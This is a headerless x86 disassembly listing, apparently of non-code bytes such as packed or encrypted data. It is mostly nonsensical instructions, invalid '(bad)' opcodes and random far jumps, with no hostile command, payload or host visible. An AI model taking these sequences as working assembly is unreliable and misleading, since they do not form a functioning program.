  42c6cd:	mov    BYTE PTR [ebp+0x65],dh
  42c6d0:	push   0xffffffdb
  42c6d2:	mov    esi,0x3aa8d974
  42c6d7:	scas   eax,DWORD PTR es:[edi]
  42c6d8:	push   es
  42c6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6da:	jle    0x42c746
  42c6dc:	ins    DWORD PTR es:[edi],dx
  42c6dd:	fidiv  DWORD PTR [esi-0x73]
  42c6e0:	rol    BYTE PTR [ecx],1
  42c6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c6e3:	aaa    
  42c6e4:	repnz push edi
  42c6e6:	test   BYTE PTR [esi+0x2c],dl
  42c6e9:	pop    esp
  42c6ea:	push   esi
  42c6eb:	call   0xc44a:0xac20d11f
  42c6f2:	adc    DWORD PTR [ecx+0x2f],edi
  42c6f5:	adc    DWORD PTR [edx],ebp
  42c6f7:	mov    bl,0xb2
  42c6f9:	test   eax,0x7247ebef
  42c6fe:	ins    BYTE PTR es:[edi],dx
  42c6ff:	cmp    DWORD PTR [eax],edi
  42c701:	sub    bh,al
  42c703:	cs jecxz 0x42c694
  42c706:	ret    0x7dde
  42c709:	ins    BYTE PTR es:[edi],dx
  42c70a:	pop    ebp
  42c70b:	jo     0x42c786
  42c70d:	lods   eax,DWORD PTR ds:[esi]
  42c70e:	lahf   
  42c70f:	pop    ecx
  42c710:	add    al,0x9e
  42c712:	dec    eax
  42c713:	xchg   esi,eax
  42c714:	loope  0x42c786
  42c716:	iret   
  42c717:	retf   0x5558
  42c71a:	jmp    0xb39a:0x2f498eed
  42c721:	xchg   ecx,eax
  42c722:	push   esi
  42c723:	and    eax,0x587c94f4
  42c728:	mov    cl,0xf4
  42c72a:	inc    edx
  42c72b:	xchg   esp,eax
  42c72c:	aam    0x81
  42c72e:	test   al,0x6a
  42c730:	shl    bl,1
  42c732:	shr    DWORD PTR [edx+0x156dd133],1
  42c738:	mov    ebx,DWORD PTR [eax+0x47cc750d]
  42c73e:	push   edx
  42c73f:	push   eax
  42c740:	mov    ds:0x901b6b7,al
  42c745:	push   cs
  42c746:	adc    ebx,edi
  42c748:	add    BYTE PTR ds:[ebx-0x41657ec8],0xec
  42c750:	pop    esi
  42c751:	bound  ecx,QWORD PTR ds:0x12d46754
  42c757:	sub    bl,ah
  42c759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c75a:	out    dx,eax
  42c75b:	xor    BYTE PTR [edx],ch
  42c75d:	inc    edi
  42c75e:	stos   DWORD PTR es:[edi],eax
  42c75f:	dec    ebx
  42c760:	in     eax,0x23
  42c762:	or     eax,DWORD PTR [edi-0xb]
  42c765:	fld    DWORD PTR [eax]
  42c767:	test   BYTE PTR [eax+esi*4+0x58],dl
  42c76b:	retf   0xc9fd
  42c76e:	push   ds
  42c76f:	sbb    edi,DWORD PTR [ebp-0x26]
  42c772:	pusha  
  42c773:	xchg   DWORD PTR [ebp-0x30],ecx
  42c776:	(bad)  
  42c777:	mov    edi,?
  42c779:	xchg   ecx,eax
  42c77a:	idiv   BYTE PTR [edi-0x8]
  42c77d:	xchg   edi,ecx
  42c77f:	mov    dh,0x84
  42c781:	and    edi,esi
  42c783:	or     DWORD PTR [edx+0x3a],esi
  42c786:	das    
  42c787:	sbb    esp,DWORD PTR [edi+0x32]
  42c78a:	xor    eax,0x4a6d9085
  42c78f:	nop
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	dec    edi
  42c801:	fldenv [ebp+0x1dbf450]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	push   ecx
  42c80d:	lods   al,BYTE PTR ds:[esi]
  42c80e:	lods   al,BYTE PTR ds:[esi]
  42c80f:	sub    edi,DWORD PTR [edi]
  42c811:	inc    eax
  42c812:	dec    ebp
  42c813:	xorps  xmm3,xmm2
  42c816:	icebp  
  42c817:	test   BYTE PTR [esp+eiz*8-0x44],bl
  42c81b:	sbb    BYTE PTR [esi-0x48],cl
  42c81e:	jae    0x42c86c
  42c820:	jne    0x42c7fd
  42c822:	(bad)  
  42c823:	mov    eax,0x366ae1d5
  42c828:	xor    al,BYTE PTR [edi+0x7cc4e5d7]
  42c82e:	dec    ebx
  42c82f:	add    cl,dl
  42c831:	push   ecx
  42c832:	(bad)  
  42c833:	or     cl,BYTE PTR [esi+0x24]
  42c836:	test   BYTE PTR [ebx+0x5f],0xe8
  42c83a:	add    ch,BYTE PTR [edx+eax*8]
  42c83d:	jl     0x42c807
  42c83f:	sar    ecx,cl
  42c841:	or     esi,DWORD PTR [esi+0x452467d8]
  42c847:	add    ch,bl
  42c849:	ins    BYTE PTR es:[edi],dx
  42c84a:	pop    ebx
  42c84b:	in     al,0x1a
  42c84d:	jg     0x42c8ae
  42c84f:	jae    0x42c813
  42c851:	fsubr  QWORD PTR [ebp-0x1]
  42c854:	mov    DWORD PTR [edi-0x58],esi
  42c857:	aaa    
  42c858:	cmc    
  42c859:	jo     0x42c867
  42c85b:	lds    esp,FWORD PTR [edx]
  42c85d:	xor    al,0xd5
  42c85f:	xor    eax,edx
  42c861:	addr16 mov eax,ds:0x3219
  42c865:	inc    ebp
  42c866:	mov    esi,0xb9598c20
  42c86b:	xor    bh,dh
  42c86d:	jmp    0x42c8d3
  42c86f:	adc    DWORD PTR [esi+0x58],eax
  42c872:	and    BYTE PTR [ebp-0x1160ca0a],bl
  42c878:	push   edi
  42c879:	loopne 0x42c824
  42c87b:	ins    BYTE PTR es:[edi],dx
  42c87c:	cmp    eax,DWORD PTR [esp+eiz*4+0x0]
  42c880:	xor    bl,cl
  42c882:	cli    
  42c883:	dec    edi
  42c884:	mov    BYTE PTR [ebx],0xef
  42c887:	mov    bl,0xbc
  42c889:	ins    DWORD PTR es:[edi],dx
  42c88a:	cs int 0x3a
  42c88d:	inc    ecx
  42c88e:	test   al,0x81
  42c890:	shl    DWORD PTR [edx+0x22c4f720],1
  42c896:	sbb    DWORD PTR [ebx+esi*1],edi
  42c899:	jmp    0x42c8b5
  42c89b:	inc    eax
  42c89c:	je     0x42c858
  42c89e:	push   0xb214f6ff
  42c8a3:	cmp    ecx,DWORD PTR [esi+0x27cc4cda]
  42c8a9:	mov    eax,ds:0x412d6c2d
  42c8ae:	icebp  
  42c8af:	push   0xffffffde
  42c8b1:	sbb    al,BYTE PTR [ebx-0x1f]
  42c8b4:	pop    ebp
  42c8b5:	imul   esi,DWORD PTR [esi+0x20622c89],0x266221b0
  42c8bf:	in     eax,0xf
  42c8c1:	push   ebx
  42c8c2:	push   ss
  42c8c3:	adc    eax,DWORD PTR [edx+0x49542017]
  42c8c9:	mov    esp,0xe592bd99
  42c8ce:	mov    ebp,0xadb33211
  42c8d3:	push   ebp
  42c8d4:	mov    cl,0xb7
  42c8d6:	inc    BYTE PTR [ecx+edx*1]
  42c8d9:	xor    eax,DWORD PTR [edi]
  42c8db:	jnp    0x42c93d
  42c8dd:	popa   
  42c8de:	jbe    0x42c863
  42c8e0:	retf   0x995c
  42c8e3:	xchg   ebx,eax
  42c8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8e5:	xchg   ebx,eax
  42c8e6:	xor    ebx,ebx
  42c8e8:	fisub  WORD PTR [ebx-0x13]
  42c8eb:	sub    eax,0x8aecf38
  42c8f0:	enter  0x5da7,0x31
  42c8f4:	inc    esi
  42c8f5:	inc    ecx
  42c8f6:	push   ds
  42c8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8f8:	pop    edx
  42c8f9:	sbb    dh,ch
  42c8fb:	xchg   DWORD PTR [ecx-0x17],esi
  42c8fe:	leave  
  42c8ff:	inc    ecx
  42c900:	pop    esi
  42c901:	jne    0x42c945
  42c903:	scas   al,BYTE PTR es:[edi]
  42c904:	out    dx,eax
  42c905:	jge    0x42c8c1
  42c907:	pop    ecx
  42c908:	(bad)  
  42c90a:	xchg   esp,eax
  42c90b:	aaa    
  42c90c:	xor    DWORD PTR [eax+0xe10d],0x0
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x58cd49e5
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	xchg   esp,eax
  42c98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c98e:	xor    bh,bl
  42c990:	call   0x96016118
  42c995:	inc    ebx
  42c997:	push   esp
  42c998:	and    al,0xa5
  42c99a:	cmp    edx,esp
  42c99c:	xor    al,0x94
  42c99e:	ret    
  42c99f:	fimul  WORD PTR [edx+edx*2+0x665cf999]
  42c9a6:	out    dx,al
  42c9a7:	shr    BYTE PTR [edi],1
  42c9a9:	repnz dec ebp
  42c9ab:	jecxz  0x42ca1a
  42c9ad:	and    al,BYTE PTR [edi+eax*4-0x415eef]
  42c9b4:	in     al,dx
  42c9b5:	loope  0x42c9ac
  42c9b7:	test   dl,0xc
  42c9ba:	ret    
  42c9bb:	sbb    eax,0x31b585fa
  42c9c0:	jmp    0x6a95:0x941619f5
  42c9c7:	(bad)  
  42c9c8:	or     eax,DWORD PTR [ebp+0xba27889]
  42c9ce:	inc    eax
  42c9cf:	imul   esi,DWORD PTR [edx],0x71
  42c9d2:	push   0x40
  42c9d4:	retf   
  42c9d5:	test   al,0xed
  42c9d7:	lock sbb al,0xec
  42c9da:	out    0xe3,eax
  42c9dc:	pushf  
  42c9dd:	jge    0x42ca3a
  42c9df:	mov    ah,0x1
  42c9e1:	jle    0x42c965
  42c9e3:	clc    
  42c9e4:	mov    cl,0x29
  42c9e6:	jo     0x42ca15
  42c9e8:	inc    esi
  42c9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9ea:	aas    
  42c9eb:	add    ch,BYTE PTR [ecx-0x6c]
  42c9ee:	jle    0x42c971
  42c9f0:	mov    ch,0xc5
  42c9f2:	sbb    dh,dl
  42c9f4:	sub    DWORD PTR [esi+edx*4],ebp
  42c9f7:	jne    0x42c9fe
  42c9f9:	div    BYTE PTR ds:0xd8b2f5ed
  42c9ff:	call   0x5c1a:0x7229459d
  42ca06:	loope  0x42c997
  42ca08:	fucomp st(4)
  42ca0a:	out    dx,eax
  42ca0b:	inc    ebp
  42ca0c:	adc    bl,BYTE PTR [eax+0x6f089c60]
  42ca12:	jp     0x42c9da
  42ca14:	aaa    
  42ca15:	test   eax,0x22d261e3
  42ca1a:	cwde   
  42ca1b:	hlt    
  42ca1c:	xchg   ebx,eax
  42ca1d:	div    BYTE PTR [edx]
  42ca1f:	hlt    
  42ca20:	hlt    
  42ca21:	dec    esi
  42ca22:	rol    BYTE PTR [eax+0x5c],1
  42ca25:	adc    al,0x6b
  42ca27:	cdq    
  42ca28:	cld    
  42ca29:	pop    edx
  42ca2a:	xor    esp,DWORD PTR [ecx-0x6718cea4]
  42ca30:	and    al,BYTE PTR [edx-0x17]
  42ca33:	sub    DWORD PTR ss:[edi-0xc],0x967f5ffb
  42ca3b:	inc    esi
  42ca3c:	lock add DWORD PTR ds:0x3d71a79e,0x5d
  42ca44:	loopne 0x42ca1f
  42ca46:	jecxz  0x42c9f9
  42ca48:	fs icebp 
  42ca4a:	das    
  42ca4b:	sub    eax,0x678c5e3f
  42ca50:	push   ecx
  42ca51:	inc    edx
  42ca52:	pop    esi
  42ca53:	cwde   
  42ca54:	out    0x78,eax
  42ca56:	cli    
  42ca57:	aaa    
  42ca58:	and    eax,0x89d88b60
  42ca5d:	mov    eax,ds:0x36cb1e4
  42ca62:	out    dx,al
  42ca63:	inc    ebp
  42ca64:	or     esi,edx
  42ca66:	inc    edx
  42ca67:	xor    ah,BYTE PTR [edx+0x1c]
  42ca6a:	and    DWORD PTR [eax+eiz*2-0x2c],0xbda3a4a1
  42ca72:	shr    BYTE PTR [eax],1
  42ca74:	mov    bl,0x15
  42ca76:	xchg   edx,eax
  42ca77:	mov    eax,ds:0x64061343
  42ca7c:	jb     0x42caa4
  42ca7e:	jae    0x42cabe
  42ca80:	push   edi
  42ca81:	test   BYTE PTR [eiz*2+0x8853832],dl
  42ca88:	dec    edx
  42ca89:	sub    DWORD PTR [edx+0x5b],eax
  42ca8c:	xor    bl,ah
  42ca8e:	faddp  st(1),st
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x4b049140]
  42cb02:	jg     0x42cab5
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	jne    0x42ca9e
  42cb0e:	xchg   ecx,eax
  42cb0f:	or     eax,0x4aeead02
  42cb14:	sti    
  42cb15:	cmp    cl,BYTE PTR [eax-0x10]
  42cb18:	adc    al,0xbb
  42cb1a:	into   
  42cb1b:	test   al,0xd0
  42cb1d:	mov    ebx,DWORD PTR [ebp-0x631fe3f9]
  42cb23:	adc    eax,0xaadc65e3
  42cb28:	fist   WORD PTR [ebp+0x248b4408]
  42cb2e:	jmp    0x42cb2e
  42cb30:	mov    bl,0x75
  42cb32:	xor    ebp,esi
  42cb34:	ror    DWORD PTR [ebp-0x5b],cl
  42cb37:	js     0x42cb89
  42cb39:	push   0x32aa1fc
  42cb3e:	mov    ecx,0xebbe08cc
  42cb43:	iret   
  42cb44:	imul   edx,DWORD PTR [ecx-0x4ad7d8f2],0x6b
  42cb4b:	push   ecx
  42cb4c:	xchg   esi,eax
  42cb4d:	sub    BYTE PTR [esi],bl
  42cb4f:	stos   BYTE PTR es:[edi],al
  42cb50:	push   esi
  42cb51:	in     eax,0x5a
  42cb53:	xor    eax,ebx
  42cb55:	std    
  42cb56:	or     DWORD PTR [edx-0x5b],ebp
  42cb59:	popf   
  42cb5a:	pusha  
  42cb5b:	xor    ch,dl
  42cb5d:	jbe    0x42cb8f
  42cb5f:	cmp    ebp,DWORD PTR [edi]
  42cb61:	ss push 0xffffff94
  42cb64:	xor    BYTE PTR [ecx],al
  42cb66:	pop    ebp
  42cb67:	cmp    eax,0x27c7af41
  42cb6c:	(bad)  
  42cb6d:	mov    ebx,DWORD PTR [ecx]
  42cb6f:	xchg   esi,eax
  42cb70:	pop    ebp
  42cb71:	dec    edi
  42cb72:	push   edi
  42cb73:	jno    0x42cb4b
  42cb75:	in     eax,0x94
  42cb77:	(bad)  
  42cb79:	sti    
  42cb7a:	fadd   QWORD PTR [esi-0x249ea30c]
  42cb80:	add    edi,DWORD PTR [eax+0x31]
  42cb83:	mov    al,ds:0x90952314
  42cb88:	inc    ecx
  42cb89:	rcr    dl,cl
  42cb8b:	into   
  42cb8c:	push   esp
  42cb8d:	bound  ebx,QWORD PTR [esi-0x3]
  42cb90:	pop    ds
  42cb91:	pop    ebx
  42cb92:	sub    DWORD PTR ds:0xbf21aa6f,ecx
  42cb98:	lahf   
  42cb99:	rcl    bl,cl
  42cb9b:	cmc    
  42cb9c:	or     dl,cl
  42cb9e:	jo     0x42cb55
  42cba0:	jecxz  0x42cbd4
  42cba2:	inc    ecx
  42cba3:	jns    0x42cb3b
  42cba5:	cmp    BYTE PTR [eax+edx*8+0x32f8ed72],ch
  42cbac:	or     al,0xb1
  42cbae:	dec    esp
  42cbaf:	mov    al,0x92
  42cbb1:	lea    esp,[eax+0x28]
  42cbb4:	outs   dx,WORD PTR cs:[esi]
  42cbb7:	mov    ebp,0x83caa5a5
  42cbbc:	xchg   ecx,eax
  42cbbd:	inc    ebx
  42cbbe:	mov    ah,0xbd
  42cbc0:	inc    ebp
  42cbc1:	xor    ebp,DWORD PTR fs:[esi-0x2271fb61]
  42cbc8:	mov    ds:0x8dcaf7f6,al
  42cbcd:	mov    DWORD PTR [ebp-0x5a],ebx
  42cbd0:	xchg   BYTE PTR [esi-0x65552024],dl
  42cbd6:	out    dx,al
  42cbd7:	ret    0xe6c3
  42cbda:	and    DWORD PTR [edi],esp
  42cbdc:	adc    BYTE PTR [eax-0x7884c5ce],0x6a
  42cbe3:	push   ebx
  42cbe4:	add    DWORD PTR [eax-0x56810fc8],esp
  42cbea:	xchg   ecx,eax
  42cbeb:	sub    bh,BYTE PTR [edi-0x39b48433]
  42cbf1:	dec    ebx
  42cbf2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cbf4:	push   ecx
  42cbf5:	push   edi
  42cbf6:	mov    dh,0x64
  42cbf8:	xor    BYTE PTR [esi+ecx*4],al
  42cbfb:	(bad)  
  42cbfc:	sbb    edx,DWORD PTR [edi+edx*1-0x5e]
  42cc00:	add    esp,DWORD PTR [eax-0x3d1eca74]
  42cc06:	into   
  42cc07:	or     al,0x61
  42cc09:	shl    BYTE PTR [ebp+0x2c],cl
  42cc0c:	or     BYTE PTR [edi+0x58],dh
  42cc0f:	popa   
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x296b9fc2
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	jg     0x42cc49
  42cc8e:	pop    edi
  42cc8f:	imul   ebx,DWORD PTR [ebx+0x38082a60],0x7820268f
  42cc99:	(bad)  
  42cc9b:	fadd   DWORD PTR [ebp+eiz*8+0x64bc493e]
  42cca2:	add    eax,0xccf07417
  42cca7:	sbb    ch,BYTE PTR [ebp-0xb]
  42ccaa:	sbb    al,ch
  42ccac:	pop    ebx
  42ccad:	push   edi
  42ccae:	shl    BYTE PTR [edi+ebx*2+0x6],cl
  42ccb2:	push   0xffffffa8
  42ccb4:	add    esp,esp
  42ccb6:	inc    ebx
  42ccb7:	pop    esp
  42ccb8:	mov    eax,ds:0x72a98420
  42ccbd:	aas    
  42ccbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ccbf:	xchg   esp,eax
  42ccc0:	or     ebp,0x3cdb4eb3
  42ccc6:	xlat   BYTE PTR ds:[ebx]
  42ccc7:	sti    
  42ccc8:	cmc    
  42ccc9:	and    BYTE PTR [ebp-0x6],bh
  42cccc:	mov    bl,0x62
  42ccce:	aas    
  42cccf:	add    BYTE PTR [esi+edi*8-0x4586221b],cl
  42ccd6:	arpl   WORD PTR [ebp-0x1e65f48e],cx
  42ccdc:	pop    esi
  42ccdd:	pop    ecx
  42ccde:	xchg   DWORD PTR [esi+ebp*2],eax
  42cce1:	out    dx,al
  42cce2:	dec    edi
  42cce3:	jmp    0x2df:0x6c8e9b0d
  42ccea:	adc    BYTE PTR [ebx+eax*1+0x5a],dl
  42ccee:	or     eax,0xb0240ab9
  42ccf3:	into   
  42ccf4:	mov    ds:0x563f0040,al
  42ccfa:	stos   DWORD PTR es:[edi],eax
  42ccfb:	dec    eax
  42ccfc:	sub    esp,ecx
  42ccfe:	repnz mov BYTE PTR [eax-0x43],ch
  42cd02:	std    
  42cd03:	test   eax,0x305b5a4a
  42cd08:	mov    WORD PTR [edx-0x80],cs
  42cd0b:	ja     0x42ccfd
  42cd0d:	sbb    eax,0xc6f3da67
  42cd12:	ins    BYTE PTR es:[edi],dx
  42cd13:	ror    DWORD PTR [eax],1
  42cd15:	data16 (bad) 
  42cd17:	fisttp DWORD PTR [edx-0x6818a4dd]
  42cd1d:	cdq    
  42cd1e:	lahf   
  42cd1f:	pop    ss
  42cd20:	lods   al,BYTE PTR ds:[esi]
  42cd21:	fisttp WORD PTR [edx+0x2e]
  42cd24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd25:	sub    esp,DWORD PTR [edx]
  42cd27:	in     al,dx
  42cd28:	push   ds
  42cd29:	jmp    0xe2ae:0xdd6ce2a6
  42cd30:	mov    ch,0xaf
  42cd32:	push   edi
  42cd33:	mov    ecx,0x82b5a5de
  42cd38:	mov    ah,0x88
  42cd3a:	ficomp WORD PTR ds:[edx-0x4c]
  42cd3e:	jno    0x42cd6c
  42cd40:	or     BYTE PTR [ebx],dh
  42cd42:	out    dx,eax
  42cd43:	or     bl,BYTE PTR [edi-0x1]
  42cd46:	xchg   edx,eax
  42cd47:	sbb    esp,DWORD PTR [eax+0x395236ee]
  42cd4d:	jae    0x42ccfd
  42cd4f:	inc    esp
  42cd50:	shl    BYTE PTR [ebp+0x41],0x13
  42cd54:	mov    bh,BYTE PTR [ecx+0x24]
  42cd57:	jmp    0x471026f7
  42cd5c:	mov    BYTE PTR [edi],dl
  42cd5e:	sub    DWORD PTR [edx],edx
  42cd60:	test   DWORD PTR [edx-0x23],esi
  42cd63:	sub    ecx,edx
  42cd65:	out    dx,al
  42cd66:	jg     0x42cd48
  42cd68:	jg     0x42cdac
  42cd6a:	sbb    eax,DWORD PTR [esi]
  42cd6c:	test   esi,esi
  42cd6e:	or     DWORD PTR es:[ebx+0x2b],esi
  42cd72:	sub    eax,0x947193ca
  42cd77:	pop    ebp
  42cd78:	nop
  42cd79:	sub    DWORD PTR ds:0x19a1687b,ecx
  42cd7f:	and    BYTE PTR [esi-0x1b],bh
  42cd82:	xchg   ebp,eax
  42cd83:	ss cmc 
  42cd85:	or     dh,BYTE PTR [ebp+0x27]
  42cd88:	mov    esp,0x733b19bd
  42cd8d:	mov    cl,0x1d
  42cd8f:	mov    edx,0x0
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x59
  42ce01:	add    ah,al
  42ce03:	mov    esp,0x1e004
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	ins    DWORD PTR es:[edi],dx
  42ce0d:	mov    ah,0xa4
  42ce0f:	aaa    
  42ce10:	not    BYTE PTR [ebp+0x4a5cc8fd]
  42ce16:	adc    bh,bl
  42ce18:	xor    ebp,DWORD PTR [edx]
  42ce1a:	inc    eax
  42ce1b:	out    dx,al
  42ce1c:	std    
  42ce1d:	push   0x896642b3
  42ce22:	jmp    0x42ce0a
  42ce24:	out    dx,al
  42ce25:	mov    al,0x8d
  42ce27:	xchg   ecx,eax
  42ce28:	in     eax,0x40
  42ce2a:	sub    dl,BYTE PTR [ecx]
  42ce2c:	scas   eax,DWORD PTR es:[edi]
  42ce2d:	int3   
  42ce2e:	jl     0x42ce70
  42ce30:	or     ecx,edi
  42ce32:	(bad)  
  42ce34:	dec    ebp
  42ce35:	jg     0x42ce47
  42ce37:	push   esi
  42ce38:	and    ebx,esp
  42ce3a:	imul   eax,ebp,0xa986599b
  42ce40:	ret    0x8d53
  42ce43:	fdivr  QWORD PTR [ebx-0x254b4d90]
  42ce49:	cmp    al,0xc5
  42ce4b:	jl     0x42ce86
  42ce4d:	mov    ecx,0xe2a6302e
  42ce52:	data16 das 
  42ce54:	pushf  
  42ce55:	xor    DWORD PTR [eax+ebx*8],esp
  42ce58:	add    edx,ecx
  42ce5a:	js     0x42ce7d
  42ce5c:	arpl   WORD PTR [esi],ax
  42ce5e:	jae    0x42ce1d
  42ce60:	pop    ebx
  42ce61:	ffreep st(3)
  42ce63:	pop    esi
  42ce64:	inc    ebx
  42ce65:	add    BYTE PTR [ecx-0x31],dh
  42ce68:	sub    eax,0xdc342891
  42ce6d:	inc    esi
  42ce6e:	push   ss
  42ce6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce70:	out    dx,al
  42ce71:	jo     0x42ced1
  42ce73:	pop    ss
  42ce74:	out    dx,al
  42ce75:	loop   0x42ce38
  42ce77:	push   eax
  42ce78:	mov    ebx,0x58b1660a
  42ce7d:	jns    0x42ce9a
  42ce7f:	jne    0x42ce1f
  42ce81:	test   eax,0x75f79188
  42ce86:	mov    al,ds:0x3665e984
  42ce8b:	dec    edi
  42ce8c:	jmp    0x42cee2
  42ce8e:	jg     0x42cebd
  42ce90:	shl    BYTE PTR [ecx+0x3d24c44a],cl
  42ce96:	push   edi
  42ce97:	inc    ebx
  42ce98:	jo     0x42ce5c
  42ce9a:	int3   
  42ce9b:	stc    
  42ce9c:	pop    ss
  42ce9d:	xchg   ebp,esp
  42ce9f:	push   ds
  42cea0:	jmp    0x32af:0x5131f7d7
  42cea7:	sub    ecx,ebp
  42cea9:	stos   BYTE PTR es:[edi],al
  42ceaa:	mov    esi,DWORD PTR [ebp-0x74]
  42cead:	push   cs
  42ceae:	sub    al,0xc6
  42ceb0:	cmc    
  42ceb1:	les    edx,FWORD PTR [eax-0x5b]
  42ceb4:	xchg   esi,eax
  42ceb5:	cmp    cl,BYTE PTR [esi]
  42ceb7:	leave  
  42ceb8:	jnp    0x42cea5
  42ceba:	add    BYTE PTR [edx-0x3],0xc7
  42cebe:	mov    eax,0xaa2d71b0
  42cec3:	leave  
  42cec4:	fstp   DWORD PTR [ebp+0x3b10e6d9]
  42ceca:	dec    ebp
  42cecb:	add    DWORD PTR [esi-0x78],eax
  42cece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cecf:	sbb    eax,0xf9f02f00
  42ced4:	icebp  
  42ced5:	sub    al,0xb3
  42ced7:	fisub  DWORD PTR [edi-0x21]
  42ceda:	mov    al,ds:0x28534892
  42cedf:	mov    dh,0xfc
  42cee1:	pop    ebp
  42cee2:	mov    DWORD PTR [ecx+0xd992091],edi
  42cee8:	xchg   ebp,eax
  42cee9:	adc    BYTE PTR [esi+0x38],bh
  42ceec:	retf   
  42ceed:	push   0x45
  42ceef:	leave  
  42cef0:	test   al,0xf6
  42cef2:	jb     0x42cf50
  42cef4:	mov    BYTE PTR [esi+0x108f12a7],bh
  42cefa:	dec    esp
  42cefb:	inc    edx
  42cefc:	inc    esp
  42cefd:	push   ebx
  42cefe:	sub    al,0x38
  42cf00:	or     DWORD PTR [esi+0x440471c6],edx
  42cf06:	jo     0x42cf36
  42cf08:	mov    edi,0xe1abfccd
  42cf0d:	xor    al,0x97
  42cf0f:	aas    
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR [ecx]
  42cf81:	clc    
  42cf82:	fwait
  42cf83:	sub    ecx,DWORD PTR [eax]
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	pop    esi
  42cf8d:	mov    esi,0x4a0e46dd
  42cf92:	push   esp
  42cf93:	test   bl,bh
  42cf95:	repnz sub al,0x31
  42cf98:	sbb    BYTE PTR cs:[ebx],dh
  42cf9b:	and    DWORD PTR [eax+eax*4],ebx
  42cf9e:	add    ch,BYTE PTR [eax]
  42cfa0:	jg     0x42cf5b
  42cfa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfa3:	xor    al,0xa6
  42cfa5:	iret   
  42cfa6:	fst    DWORD PTR cs:[ebx]
  42cfa9:	fisub  WORD PTR [ecx]
  42cfab:	jbe    0x42cf9e
  42cfad:	cdq    
  42cfae:	cmp    BYTE PTR [edx-0x75],dl
  42cfb1:	pop    ebx
  42cfb2:	xchg   ecx,eax
  42cfb3:	loop   0x42cfbc
  42cfb5:	mov    esi,0x2c368a51
  42cfba:	clc    
  42cfbb:	and    bl,BYTE PTR [ecx]
  42cfbd:	pop    ecx
  42cfbe:	jno    0x42d033
  42cfc0:	imul   ebx,DWORD PTR [eax+edx*2],0xffffff9a
  42cfc4:	daa    
  42cfc5:	sti    
  42cfc6:	(bad)  
  42cfc7:	in     eax,dx
  42cfc8:	inc    ecx
  42cfc9:	push   ebx
  42cfca:	stos   BYTE PTR es:[edi],al
  42cfcb:	rcl    DWORD PTR [edi],cl
  42cfcd:	pop    edi
  42cfce:	ror    DWORD PTR [ebp-0x2b],1
  42cfd1:	ds xchg ebx,eax
  42cfd3:	das    
  42cfd4:	ror    BYTE PTR [ebx],1
  42cfd6:	repz sub BYTE PTR [edi-0x2a7d5821],al
  42cfdd:	das    
  42cfde:	xor    eax,DWORD PTR [ebp+0x43e5cdaf]
  42cfe4:	out    0x19,al
  42cfe6:	inc    edi
  42cfe7:	push   ss
  42cfe8:	(bad)  
  42cfe9:	ds jb  0x42cfd2
  42cfec:	cmp    al,0x29
  42cfee:	daa    
  42cfef:	pop    esp
  42cff0:	inc    edi
  42cff1:	sbb    BYTE PTR [ebx+0xeeb28f6],cl
  42cff7:	cmp    ah,cl
  42cff9:	push   esp
  42cffa:	(bad)
  42cffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cffe:	out    0x54,eax
  42d000:	sub    DWORD PTR [ecx+0x53db131d],0x37
  42d007:	pop    ebx
  42d008:	or     edi,DWORD PTR [edx+edx*4-0x33]
  42d00c:	mov    ds:0x23e271c9,al
  42d011:	lods   eax,DWORD PTR ds:[esi]
  42d012:	ss es mov edi,0xe8b879f6
  42d019:	pop    ebp
  42d01a:	dec    esi
  42d01b:	pop    esp
  42d01c:	sti    
  42d01d:	enter  0xdcc3,0xd3
